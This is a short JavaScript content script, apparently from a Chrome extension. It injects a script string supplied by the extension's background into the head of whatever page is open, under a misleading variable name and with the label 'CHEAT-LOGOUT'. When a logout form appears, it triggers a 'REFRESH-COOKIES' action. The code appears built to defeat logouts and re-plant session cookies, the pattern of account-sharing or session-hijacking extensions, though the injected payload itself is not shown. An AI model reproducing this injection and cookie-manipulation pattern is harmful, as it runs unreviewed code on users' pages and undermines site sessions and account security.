chrome.runtime.sendMessage({action: "CONTROLLER", domain: window.location.hostname.replace(/(https?:\/\/)?(www.)?/i, ''), actionType: 'CHEAT-LOGOUT' }, (response) => {
    let style = window.document.createElement('script');
    style.setAttribute("type",'text/javascript');
    style.appendChild(window.document.createTextNode(response.script));
    if(document.readyState === 'complete') {
      (window.document.head || document.getElementsByTagName('head')[0]).appendChild(style);
         } else {
     document.addEventListener("DOMContentLoaded", function () {
        (window.document.head || document.getElementsByTagName('head')[0]).appendChild(style);
    });
   }
});
setTimeout( () => {
  if(document.querySelector('form[action*="logout.php"]')) {
    chrome.runtime.sendMessage({action: "REFRESH-COOKIES"}, (response) => {});
  } 
} , 5000 ) ;



